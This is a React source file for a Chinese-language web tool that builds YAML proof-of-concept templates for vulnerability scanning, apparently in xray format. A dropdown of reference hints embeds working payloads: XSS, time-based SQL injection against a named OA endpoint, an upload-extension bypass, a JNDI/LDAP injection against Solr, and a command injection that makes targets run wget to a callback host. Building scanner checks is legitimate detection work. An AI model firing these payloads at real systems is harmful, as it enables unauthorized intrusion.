import React from 'react';
import update from 'immutability-helper';
import yaml from 'js-yaml';
import clone from 'clone';
import ClipboardJS from 'clipboard';
import { Layout, Menu, Breadcrumb, Row, Col, Form, Input, Button, Affix, notification } from 'antd';
import RuleComponent from './Rule';
import Rule from './model/rule'
import { findObjectByIndex } from "./model/helper";
import { Select } from 'antd'; // 从 Ant Design 库中导入 Select 组件

const { Header, Content, Footer } = Layout;

export default class App extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      name: "poc-yaml-sql",
      transport : "http",
      rules: [new Rule()],
      detail: {},
      poc: "",
    };

    this.updateRule = this.updateRule.bind(this);
    this.generatePOC = this.generatePOC.bind(this);
    this.addRule = this.addRule.bind(this);
    this.deleteRule = this.deleteRule.bind(this);
    this.notify = this.notify.bind(this);
  }


  componentDidMount() {
    const cjs = new ClipboardJS('#copy-btn');
    cjs.on('success', e => {
      this.notify("复制成功", "POC内容已成功复制到剪切板");
    })
  }

  notify(title, description) {
    notification.success({
      message: title,
      description: description,
      duration: 3,
    })
  }

  updateRule(index, key, value) {
    const i = findObjectByIndex(this.state.rules, index);
    if (i >= 0) {
      let rules = update(this.state.rules, {[i]: {[key]: {$set: value}}});
      this.setState({rules});
    }
  }

  deleteRule(index) {
    const i = findObjectByIndex(this.state.rules, index);
    if (i >= 0) {
      let rules = update(this.state.rules, {$splice: [[i, 1]]});
      this.setState({rules});
    }
  }

  generatePOC() {
    let data = {
      name: this.state.name,
      transport: this.state.transport,
      rules: clone(this.state.rules),
    };

    for (let rule of data.rules) {
      delete rule['index'];

      let headers = {};
      for (let header of rule.headers) {
        if (header['key']) {
          headers[header['key']] = header['value'];
        }
      }

      if (Object.keys(headers).length > 0) {
        rule.headers = headers;
      } else {
        delete rule.headers;
      }

      if (!rule.body.length) {
        delete rule.body;
      }

      if (!rule.path.length) {
        delete rule.path;
      }

      if (!rule.search.length) {
        delete rule.search;
      }

      rule.expression = `${rule.expression}\n`;

      let request = {};
      let expressionq = {};
      request.method = rule.method;
      request.follow_redirects = rule.follow_redirects;
      request.body = rule.body;
      request.path = rule.path;

      expressionq = rule.expression;

      delete rule.method;
      delete rule.follow_redirects;
      delete rule.body;
      delete rule.path;
      delete rule.expression;

      rule.request = request;
      rule.expression = expressionq;
    }

    let rulesObj = {};
    data.rules.forEach((rule, index) => {
      rulesObj[`r${index}`] = rule;
    });
    const ruleCount = Object.keys(rulesObj).length;
    function buildExpression(ruleCount) {
      let result = '';

      for (let i = 0; i < ruleCount; i++) {
        if (i > 0) {
          result += '&&';
        }
        result += `r${i}()`;
      }

      return result;
    }

    const poc = yaml.safeDump({
      name: this.state.name,
      transport: this.state.transport,
      rules: rulesObj,
      expression: buildExpression(ruleCount),
    });

    this.setState({ poc, isEditable: true });
  }


  addRule() {
    let rules = update(this.state.rules, {$push: [new Rule()]});
    this.setState({rules})
  }

  

  render() {
    const formItemLayout = {
      labelCol: { span: 2 },
      wrapperCol: { span: 22 },
    };

    return (
      <Layout className="layout">
        <Header>
          <div className="logo" ><span role="img" aria-label="dna" aria-hidden="true">🧬</span> Comal POC Generation</div>
          <Menu
            theme="dark"
            mode="horizontal"
            defaultSelectedKeys={['2']}
            style={{ lineHeight: '64px' }}
          >
          </Menu>
        </Header>
        <Content style={{ padding: '0 50px' }}>
          <Breadcrumb style={{ margin: '16px 0' }}>
            <Breadcrumb.Item>首页</Breadcrumb.Item>
            <Breadcrumb.Item>POC生成</Breadcrumb.Item>
          </Breadcrumb>
          <div style={{ background: '#fff', padding: 24, minHeight: 280 }}>
          <Row gutter={16} type="flex">
            <Col span={12} >
              <Form layout={"horizontal"} labelAlign="left">
                <Form.Item label="POC名" {...formItemLayout}>
                  <Input 
                    placeholder="由数字、字母、短横线组成" 
                    type="text" 
                    value={this.state.name}
                    onChange={e => this.setState({name: e.target.value})}
                  />
                </Form.Item>
                {this.state.rules.map((rule, index) =>
                  <RuleComponent
                    key={rule.index}
                    rule={rule}
                    ruleSize={this.state.rules.length}
                    updateHandler={this.updateRule}
                    addHandler={this.addRule}
                    deleteHandler={this.deleteRule}
                  />
                )}
              </Form>
            </Col>
              <Col span={12} style={{ paddingTop: "4px" }}>
                <Affix offsetTop={8}>
                  <div style={{ display: "flex", flexDirection: "column" }}>
                    <div style={{ marginBottom: "15px" }}>
                      <span style={{ fontSize: "18px", fontWeight: "bold"}}>请选择参考提示</span>
                      <br></br>
                      <Select
                        placeholder="选择生成的POC内容"
                        value={this.state.selectedPOC}
                        style={{ width: "100%" }}
                        onChange={value => this.setState({ selectedPOC: value })}
                      >
                        <Select.Option value="poc2">poc-yaml-sqli(no-echo)</Select.Option>
                        <Select.Option value="poc1">poc-yaml-xss</Select.Option>
                        <Select.Option value="poc3">poc-yaml-upload</Select.Option>
                        <Select.Option value="poc4">poc-yaml-ldapReverse</Select.Option>
                        <Select.Option value="poc5">poc-yaml-httpReverse</Select.Option>
                        {/* 根据需要添加更多选项 */}
                      </Select>
                    </div>
                    <div>
                      <Input.TextArea
                        autosize={{ minRows: 10 }}
                        placeholder="根据选择生成的POC内容"
                        value={this.state.selectedPOC === 'poc1' ? 'path: /%3Cscript%3Ealert(document.domain)%3C/script%3E  //注入的payload\nexpression: response.status==404 && \nresponse.body.bcontains(b\' / tmp / www / <script>alert(document.domain)</script>\') && //响应特征\nresponse.headers["Content-Type"].contains("text/html") //检查体的header字段\n ' 
                        :this.state.selectedPOC === 'poc2' ? '//采用延时注入\npath: /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a3%27+--%20and%201=1\n\n//使用 response.latency > 3000 判断生效的时间\nexpression:  response.status == 200 && (response.latency > 3000) && response.body.bcontains(b\'id\') && response.body.bcontains(b\'text\') && response.body.bcontains(b\'permissions\') && response.body.bcontains(b\'GetTreeDate.aspx?nodeid\') \n '
                        :this.state.selectedPOC === 'poc3' ? 'set: filename: randomLowercase(8) //设置相关的变量\n\nbody: |\n        -----------------------------318949277012917151102295043236\n        Content-Disposition: form-data; name="uploaded_file"; filename="{{filename}}.ph$p" //替换变量字符\n'
                        :this.state.selectedPOC === 'poc4' ? 'set:\n    reverse: newReverse()\n    reverseURL: reverse.ldap\n// 起一个ldap服务，用于接受请求\n path: /solr/admin/collections?action=${jndi:{{reverseURL}}}&wt=json //替换生成的变量\n expression: reverse.wait(5) //等待连接'
                        :this.state.selectedPOC === 'poc5' ? 'set:\n    reverse: newReverse()\n    reverseURL: reverse.url\n// 起一个http服务用于接受请求\npath: //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20{{reverseURL}})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything\n//使用wget去访问起来的web服务\n expression: reverse.wait(5) //等待连接'
                        :
                        ''
                      }
                        readOnly={true}
                      />
                    </div>
                    <span style={{ fontSize: "18px", fontWeight: "bold" }}>生成的poc</span>
                    <div>
                      <Input.TextArea
                        autosize={{ minRows: 10 }}
                        placeholder="生成POC内容"
                        value={this.state.poc}
                        id="poc-detail"
                        readOnly={!this.state.isEditable}
                        //将生成的内容可以进行编辑
                        onChange={(e) => this.setState({ poc: e.target.value })}
                      />
                    </div>
                    <Row justify="end" type="flex">
                      <Button type="primary" size="default" onClick={this.generatePOC} className="br">生成</Button>
                      <Button
                        type="dashed"
                        icon="copy"
                        id="copy-btn"
                        data-clipboard-text={this.state.poc}
                      >
                        复制POC
                      </Button>
                    </Row>
                    
                  </div>
                </Affix>
              </Col>
          </Row>
          </div>
        </Content>
        
        <Footer style={{ textAlign: 'center' }}>©2023 Comal POC Generation| <a href="https://i8bbmkcybg.feishu.cn/docx/ZSTddSENioK8Z4xhbvNchAq0nDb">点此处跳转到文档参考</a></Footer>
      </Layout>
    );
  }
}